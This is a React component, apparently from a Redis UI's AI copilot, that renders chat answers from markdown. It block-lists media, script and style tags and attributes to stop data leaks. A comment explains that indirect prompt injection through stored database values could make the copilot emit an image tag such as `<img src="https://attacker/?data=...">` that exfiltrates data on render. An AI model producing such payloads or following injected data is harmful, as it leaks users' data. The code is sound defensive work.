import React, { useCallback, useEffect, useState } from 'react'
import JsxParser from 'react-jsx-parser'
import MarkdownToJsxString from 'uiSrc/services/formatter/MarkdownToJsxString'
import { CloudLink } from 'uiSrc/components/markdown'
import { AdditionalRedisModule } from 'apiClient'
import { ChatExternalLink, CodeBlock } from './components'

export interface CodeProps {
  children: string
  lang: string
}

/**
 * Copilot answers are plain markdown (text, tables, code, links). They never
 * contain images or embedded media. Because message content can be influenced
 * by untrusted data (e.g. indirect prompt injection via values stored in the
 * database), we block every tag able to trigger an outbound request on render
 * — otherwise a crafted `<img src="https://attacker/?data=...">` would silently
 * exfiltrate data as soon as the browser loads it. See RED-194228 / VDP-4596.
 */
const BLACKLISTED_TAGS = [
  'iframe',
  'script',
  'img',
  'image',
  'picture',
  'source',
  'video',
  'audio',
  'track',
  'object',
  'embed',
  'style',
  'svg',
  'input',
]

// Strip event handlers (default) plus attributes that can trigger an outbound
// request on render: `style` (CSS `background-image: url(...)`) and the legacy
// `background` image URL supported on `<table>`/`<td>` in some browsers.
const BLACKLISTED_ATTRS: Array<string | RegExp> = [
  /^on.+/i,
  /^style$/i,
  /^background$/i,
]

// Note: raw HTML `<link>` elements never reach the parser — `remarkSanitize`
// (DOMPurify) strips them during formatting. We must NOT blacklist the `link`
// tag here: JsxParser's blacklistedTags is case-insensitive, so it would also
// drop the legitimate PascalCase <Link> component emitted by the formatter.

export interface Props {
  onRunCommand?: (query: string) => void
  modules?: AdditionalRedisModule[]
  children: string
  onMessageRendered?: () => void
}

const MarkdownMessage = (props: Props) => {
  const { modules, children, onMessageRendered, onRunCommand } = props

  const [content, setContent] = useState('')
  const [parseAsIs, setParseAsIs] = useState(false)

  const ChatCodeBlock = useCallback(
    (codeProps: CodeProps) => (
      <CodeBlock {...codeProps} modules={modules} onRunCommand={onRunCommand} />
    ),
    [modules],
  )
  const components: any = {
    Code: ChatCodeBlock,
    CloudLink,
    Link: ChatExternalLink,
  }

  useEffect(() => {
    const formatContent = async () => {
      try {
        const formated = await new MarkdownToJsxString().format({
          data: children,
          codeOptions: { allLangs: true },
        })
        setContent(formated)
      } catch {
        setParseAsIs(true)
      }
    }

    formatContent()
  }, [children])

  useEffect(() => {
    if (content) {
      onMessageRendered?.()
    }
  }, [content])

  if (parseAsIs) {
    return <>{children}</>
  }

  return (
    // @ts-ignore
    <JsxParser
      components={components}
      blacklistedTags={BLACKLISTED_TAGS}
      blacklistedAttrs={BLACKLISTED_ATTRS}
      autoCloseVoidElements
      jsx={content}
      onError={() => setParseAsIs(true)}
    />
  )
}

export default React.memo(MarkdownMessage)
